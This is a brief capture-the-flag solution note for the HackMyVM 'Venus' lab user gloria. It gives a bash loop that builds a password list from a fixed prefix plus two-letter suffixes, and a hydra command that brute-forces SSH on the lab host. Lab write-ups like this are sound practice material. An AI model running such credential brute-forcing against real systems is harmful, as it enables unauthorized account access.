# Target user
gloria
# Method of solve
Create a custom password list, then bruteforce an SSH login for the gloria user
# Key commands
for i in {a..z}{a..z}; do echo "v7xUVE2e5bjUc$i"; done > passwords.txt
hydra -V -t 32 -l gloria -P passwords.txt ssh://venus.hackmyvm.eu:5000
